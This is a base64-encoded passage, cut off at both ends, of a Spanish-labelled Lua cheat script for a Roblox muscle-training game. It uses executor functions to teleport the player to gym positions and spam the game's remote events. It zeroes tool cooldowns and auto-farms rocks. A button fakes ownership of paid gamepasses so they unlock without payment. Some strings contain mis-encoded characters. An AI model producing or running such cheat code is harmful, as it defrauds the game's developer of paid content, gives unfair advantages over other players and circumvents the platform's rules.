LjM5NDEwNCwgLTExMDYuMzE0MjEpLAogICAgICAgIFsiTGVnZW5kIEd5bSJdID0gQ0ZyYW1lLm5ldyg0MzA0Ljk5MDIzLCA5ODcuODI5OTU2LCAtNDEyNC4yMzM0KSwKICAgICAgICBbIk11c2NsZSBLaW5nIEd5bSJdID0gQ0ZyYW1lLm5ldygtODk0MC4xMjQwMiwgMTMuMTY0MjA4NCwgLTU2OTkuMTM0NzcpCiAgICB9LAogICAgWyJQdWxsIFVwIl0gPSB7CiAgICAgICAgWyJFdGVybmFsIEd5bSJdID0gQ0ZyYW1lLm5ldygtNzE3Ni4xOTE0MSwgNDUuMzk0MTA0LCAtMTEwNi4zMTQyMSksCiAgICAgICAgWyJMZWdlbmQgR3ltIl0gPSBDRnJhbWUubmV3KDQzMDQuOTkwMjMsIDk4Ny44Mjk5NTYsIC00MTI0LjIzMzQpLAogICAgICAgIFsiTXVzY2xlIEtpbmcgR3ltIl0gPSBDRnJhbWUubmV3KC04OTQwLjEyNDAyLCAxMy4xNjQyMDg0LCAtNTY5OS4xMzQ3NykKICAgIH0KfQoKLS0gV29ya291dCB0eXBlcwpsb2NhbCB3b3Jrb3V0VHlwZXMgPSB7CiAgICAiQmVuY2ggUHJlc3MiLAogICAgIlNxdWF0IiwKICAgICJEZWFkbGlmdCIsCiAgICAiUHVsbCBVcCIKfQoKLS0gR3ltIGxvY2F0aW9ucyAob25seSB0aGUgdGhyZWUgcmVxdWVzdGVkKQpsb2NhbCBneW1Mb2NhdGlvbnMgPSB7CiAgICAiRXRlcm5hbCBHeW0iLAogICAgIkxlZ2VuZCBHeW0iLAogICAgIk11c2NsZSBLaW5nIEd5bSIKfQoKLS0gU3BhbmlzaCB0cmFuc2xhdGlvbnMgZm9yIHdvcmtvdXQgdHlwZXMKbG9jYWwgd29ya291dFRyYW5zbGF0aW9ucyA9IHsKICAgIFsiQmVuY2ggUHJlc3MiXSA9ICJCZW5jaCBQcmVzcyIsCiAgICBbIlNxdWF0Il0gPSAiU3F1YXQiLAogICAgWyJEZWFkbGlmdCJdID0gIkRlYWQgTGlmdCIsCiAgICBbIlB1bGwgVXAiXSA9ICJQdWxsIFVwIgp9CgotLSBTdG9yZSByZWZlcmVuY2VzIHRvIHRvZ2dsZSBvYmplY3RzCmxvY2FsIGd5bVRvZ2dsZXMgPSB7fQoKLS0gQ3JlYXRlIGRyb3Bkb3ducyBhbmQgdG9nZ2xlcyBmb3IgZWFjaCB3b3Jrb3V0IHR5cGUKZm9yIF8sIHdvcmtvdXRUeXBlIGluIGlwYWlycyh3b3Jrb3V0VHlwZXMpIGRvCiAgICAtLSBDcmVhdGUgZHJvcGRvd24gZm9yIGd5bSBzZWxlY3Rpb24KICAgIGxvY2FsIGRyb3Bkb3duTmFtZSA9IHdvcmtvdXRUeXBlIC4uICJHeW1Ecm9wZG93biIKICAgIGxvY2FsIHNwYW5pc2hXb3Jrb3V0TmFtZSA9IHdvcmtvdXRUcmFuc2xhdGlvbnNbd29ya291dFR5cGVdCiAgICAKICAgIC0tIENyZWF0ZSB0aGUgZHJvcGRvd24gd2l0aCB0aGUgY29ycmVjdCBmb3JtYXQKICAgIGxvY2FsIGRyb3Bkb3duID0gZmFybUd5bXNGb2xkZXI6QWRkRHJvcGRvd24oc3BhbmlzaFdvcmtvdXROYW1lIC4uICIgLSBHeW0iLCBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBfR1sic2VsZWN0ZWQiIC4uIHN0cmluZy5nc3ViKHdvcmtvdXRUeXBlLCAiICIsICIiKSAuLiAiR3ltIl0gPSBzZWxlY3RlZAogICAgZW5kKQogICAgCiAgICAtLSBBZGQgZ3ltIGxvY2F0aW9ucyB0byB0aGUgZHJvcGRvd24KICAgIGZvciBfLCBneW1OYW1lIGluIGlwYWlycyhneW1Mb2NhdGlvbnMpIGRvCiAgICAgICAgZHJvcGRvd246QWRkKGd5bU5hbWUpCiAgICBlbmQKICAgIAogICAgLS0gQ3JlYXRlIHRvZ2dsZSBmb3Igd29ya291dAogICAgbG9jYWwgdG9nZ2xlTmFtZSA9IHdvcmtvdXRUeXBlIC4uICJHeW1Ub2dnbGUiCiAgICBsb2NhbCB0b2dnbGUgPSBmYXJtR3ltc0ZvbGRlcjpBZGRTd2l0Y2goc3BhbmlzaFdvcmtvdXROYW1lLCBmdW5jdGlvbihib29sKQogICAgICAgIGdldGdlbnYoKS53b3JraW5nR3ltID0gYm9vbAogICAgICAgIGdldGdlbnYoKS5jdXJyZW50V29ya291dFR5cGUgPSB3b3Jrb3V0VHlwZQogICAgICAgIAogICAgICAgIGlmIGJvb2wgdGhlbgogICAgICAgICAgICBsb2NhbCBzZWxlY3RlZEd5bSA9IF9HWyJzZWxlY3RlZCIgLi4gc3RyaW5nLmdzdWIod29ya291dFR5cGUsICIgIiwgIiIpIC4uICJHeW0iXSBvciBneW1Mb2NhdGlvbnNbMV0KICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIE1ha2Ugc3VyZSB3ZSBoYXZlIGEgdmFsaWQgcG9zaXRpb24KICAgICAgICAgICAgaWYgd29ya291dFBvc2l0aW9uc1t3b3Jrb3V0VHlwZV0gYW5kIHdvcmtvdXRQb3NpdGlvbnNbd29ya291dFR5cGVdW3NlbGVjdGVkR3ltXSB0aGVuCiAgICAgICAgICAgICAgICAtLSBTdG9wIGFueSBvdGhlciB3b3Jrb3V0IHRoYXQgbWlnaHQgYmUgcnVubmluZwogICAgICAgICAgICAgICAgZm9yIG90aGVyVHlwZSwgb3RoZXJUb2dnbGUgaW4gcGFpcnMoZ3ltVG9nZ2xlcykgZG8KICAgICAgICAgICAgICAgICAgICBpZiBvdGhlclR5cGUgfj0gd29ya291dFR5cGUgYW5kIG90aGVyVG9nZ2xlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgb3RoZXJUb2dnbGU6U2V0KGZhbHNlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIFN0YXJ0IHRoZSB3b3Jrb3V0CiAgICAgICAgICAgICAgICB0ZWxlcG9ydEFuZFN0YXJ0KHdvcmtvdXRUeXBlLCB3b3Jrb3V0UG9zaXRpb25zW3dvcmtvdXRUeXBlXVtzZWxlY3RlZEd5bV0pCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIC0tIE5vdGlmeSB1c2VyIGlmIHBvc2l0aW9uIGlzIG5vdCBmb3VuZAogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJFcnJvciIsCiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICJQb3NpdGlvbiBub3QgZm91bmQgZm9yICIgLi4gd29ya291dFR5cGUgLi4gIiBpbiAiIC4uIHNlbGVjdGVkR3ltLAogICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIFN0b3JlIHJlZmVyZW5jZSB0byB0b2dnbGUKICAgIGd5bVRvZ2dsZXNbd29ya291dFR5cGVdID0gdG9nZ2xlCmVuZAoKCmxvY2FsIGF1dG9FcXVpcFRvb2xzRm9sZGVyID0gbWFpblRhYjpBZGRGb2xkZXIoIiAgQXV0byBFcXVpcCBUb29scyIpCgotLSBGcmVlIEF1dG9MaWZ0IEdhbWVwYXNzIEJ1dHRvbgphdXRvRXF1aXBUb29sc0ZvbGRlcjpBZGRCdXR0b24oIkdhbWVwYXNzIEF1dG9MaWZ0IiwgZnVuY3Rpb24oKQogICAgbG9jYWwgZ2FtZXBhc3NGb2xkZXIgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZ2FtZXBhc3NJZHMKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBmb3IgXywgZ2FtZXBhc3MgaW4gcGFpcnMoZ2FtZXBhc3NGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBsb2NhbCB2YWx1ZSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgIHZhbHVlLk5hbWUgPSBnYW1lcGFzcy5OYW1lCiAgICAgICAgdmFsdWUuVmFsdWUgPSBnYW1lcGFzcy5WYWx1ZQogICAgICAgIHZhbHVlLlBhcmVudCA9IHBsYXllci5vd25lZEdhbWVwYXNzZXMKICAgIGVuZAplbmQsICJEZXNibG9xdWVhIGVsIGdhbWVwYXNzIGRlIEF1dG9MaWZ0IGdyYXRpcyIpCgphdXRvRXF1aXBUb29sc0ZvbGRlcjpBZGRTd2l0Y2goIkVhdCBFZ2cgKDMwIE1pbikiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGF1dG9FYXRFbmFibGVkID0gc3RhdGUKICAgIHByaW50KHN0YXRlIGFuZCAiW0F1dG9FZ2ddIEFjdGl2YWRvLiIgb3IgIltBdXRvRWdnXSBEZXNhY3RpdmFkby4iKQplbmQpCgotLSBBdXRvIFB1c2h1cHMgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBQdXNodXBzIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBfRy5BdXRvUHVzaHVwcyA9IFZhbHVlCiAgICAKICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICBsb2NhbCBwdXNodXBzVG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpCiAgICAgICAgaWYgcHVzaHVwc1Rvb2wgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChwdXNodXBzVG9vbCkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgX0cuQXV0b1B1c2h1cHMgZG8KICAgICAgICAgICAgaWYgbm90IF9HLkF1dG9QdXNodXBzIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkhheiBmbGV4aW9uZXMgYXV0b23Dg8KhdGljYW1lbnRlIikKCmxvY2FsIGF1dG9FYXRFbmFibGVkID0gZmFsc2UKbG9jYWwgZnVuY3Rpb24gZWF0UHJvdGVpbkVnZ05ldygpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGJhY2twYWNrID0gcGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCgogICAgbG9jYWwgZWdnID0gYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikKICAgIGlmIGVnZyB0aGVuCiAgICAgICAgZWdnLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZWdnOkFjdGl2YXRlKCkKICAgICAgICBlbmQpCiAgICAgICAgcHJpbnQoIltBdXRvRWdnXSBQcm90ZWluIEVnZyBjb25zdW1pZG8uIikKICAgIGVsc2UKICAgICAgICB3YXJuKCJbQXV0b0VnZ10gTm8gc2UgZW5jb250csODxpLDhuKAmcOD4oCgw6LigqzihKLDg8aSw6LigqzFocOD4oCaw4LCsyBQcm90ZWluIEVnZyBlbiBCYWNrcGFjay4iKQogICAgZW5kCmVuZAoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgaWYgYXV0b0VhdEVuYWJsZWQgdGhlbgogICAgICAgICAgICBlYXRQcm90ZWluRWdnTmV3KCkKICAgICAgICAgICAgdGFzay53YWl0KDE4MDApCiAgICAgICAgZWxzZQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSBBdXRvIEhhbmRzdGFuZHMgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBIYW5kc3RhbmRzIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBfRy5BdXRvSGFuZHN0YW5kcyA9IFZhbHVlCiAgICAKICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICBsb2NhbCBoYW5kc3RhbmRzVG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpCiAgICAgICAgaWYgaGFuZHN0YW5kc1Rvb2wgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChoYW5kc3RhbmRzVG9vbCkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhhbmRzdGFuZHMiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgX0cuQXV0b0hhbmRzdGFuZHMgZG8KICAgICAgICAgICAgaWYgbm90IF9HLkF1dG9IYW5kc3RhbmRzIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkhheiBwYXJhZGFzIGRlIG1hbm9zIGF1dG9tw4PCoXRpY2FtZW50ZSIpCgotLSBBdXRvIFNpdHVwcyBUb2dnbGUKYXV0b0VxdWlwVG9vbHNGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIFNpdHVwcyIsIGZ1bmN0aW9uKFZhbHVlKQogICAgX0cuQXV0b1NpdHVwcyA9IFZhbHVlCiAgICAKICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICBsb2NhbCBzaXR1cHNUb29sID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKQogICAgICAgIGlmIHNpdHVwc1Rvb2wgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChzaXR1cHNUb29sKQogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBlcXVpcHBlZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiU2l0dXBzIikKICAgICAgICBpZiBlcXVpcHBlZCB0aGVuCiAgICAgICAgICAgIGVxdWlwcGVkLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIF9HLkF1dG9TaXR1cHMgZG8KICAgICAgICAgICAgaWYgbm90IF9HLkF1dG9TaXR1cHMgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kLCAiSGF6IGFiZG9taW5hbGVzIGF1dG9tw4PCoXRpY2FtZW50ZSIpCgotLSBBdXRvIFB1bmNoIFRvZ2dsZQphdXRvRXF1aXBUb29sc0ZvbGRlcjpBZGRTd2l0Y2goIkF1dG8gUHVuY2giLCBmdW5jdGlvbihWYWx1ZSkKICAgIF9HLmZhc3RIaXRBY3RpdmUgPSBWYWx1ZQogICAgCiAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgLS0gRnVuY3Rpb24gdG8gZXF1aXAgYW5kIG1vZGlmeSBwdW5jaAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5mYXN0SGl0QWN0aXZlIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgX0cuZmFzdEhpdEFjdGl2ZSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICBpZiBwdW5jaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICAgICAgCiAgICAgICAgLS0gRnVuY3Rpb24gZm9yIHJhcGlkIHB1bmNoaW5nCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLmZhc3RIaXRBY3RpdmUgZG8KICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5mYXN0SGl0QWN0aXZlIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoVG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgaWYgZXF1aXBwZWQgdGhlbgogICAgICAgICAgICBlcXVpcHBlZC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZAplbmQsICJHb2xwZWEgYXV0b23Dg8KhdGljYW1lbnRlIikKCi0tIEZhc3QgVG9vbHMgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiRmFzdCBUb29scyIsIGZ1bmN0aW9uKFZhbHVlKQogICAgX0cuRmFzdFRvb2xzID0gVmFsdWUKICAgIAogICAgbG9jYWwgZGVmYXVsdFNwZWVkcyA9IHsKICAgICAgICB7CiAgICAgICAgICAgICJQdW5jaCIsCiAgICAgICAgICAgICJhdHRhY2tUaW1lIiwKICAgICAgICAgICAgVmFsdWUgYW5kIDAgb3IgMC4zNQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAiR3JvdW5kIFNsYW0iLAogICAgICAgICAgICAiYXR0YWNrVGltZSIsCiAgICAgICAgICAgIFZhbHVlIGFuZCAwIG9yIDYKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgIlN0b21wIiwKICAgICAgICAgICAgImF0dGFja1RpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciA3CiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJIYW5kc3RhbmRzIiwKICAgICAgICAgICAgInJlcFRpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciAxCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJQdXNodXBzIiwKICAgICAgICAgICAgInJlcFRpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciAxCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJXZWlnaHQiLAogICAgICAgICAgICAicmVwVGltZSIsCiAgICAgICAgICAgIFZhbHVlIGFuZCAwIG9yIDEKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgIlNpdHVwcyIsCiAgICAgICAgICAgICJyZXBUaW1lIiwKICAgICAgICAgICAgVmFsdWUgYW5kIDAgb3IgMQogICAgICAgIH0KICAgIH0KICAgIAogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKICAgIAogICAgZm9yIF8sIHRvb2xJbmZvIGluIGlwYWlycyhkZWZhdWx0U3BlZWRzKSBkbwogICAgICAgIGxvY2FsIHRvb2wgPSBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sSW5mb1sxXSkKICAgICAgICBpZiB0b29sIGFuZCB0b29sOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzJdKSB0aGVuCiAgICAgICAgICAgIHRvb2xbdG9vbEluZm9bMl1dLlZhbHVlID0gdG9vbEluZm9bM10KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBlcXVpcHBlZFRvb2wgPSBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzFdKQogICAgICAgIGlmIGVxdWlwcGVkVG9vbCBhbmQgZXF1aXBwZWRUb29sOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzJdKSB0aGVuCiAgICAgICAgICAgIGVxdWlwcGVkVG9vbFt0b29sSW5mb1syXV0uVmFsdWUgPSB0b29sSW5mb1szXQogICAgICAgIGVuZAogICAgZW5kCmVuZCwgIkFjZWxlcmEgdG9kYXMgbGFzIGhlcnJhbWllbnRhcyIpCgoKbG9jYWwgUm9jayA9IHdpbmRvdzpBZGRUYWIoIlJvY2siKQoKZnVuY3Rpb24gZ2V0dG9vbCgpCiAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB2Lk5hbWUgPT0gIlB1bmNoIiBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHYpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCmVuZAoKUm9jazpBZGRTd2l0Y2goIlRpbnkgUm9jayIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJUaW55IElzbGFuZCBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKUm9jazpBZGRTd2l0Y2g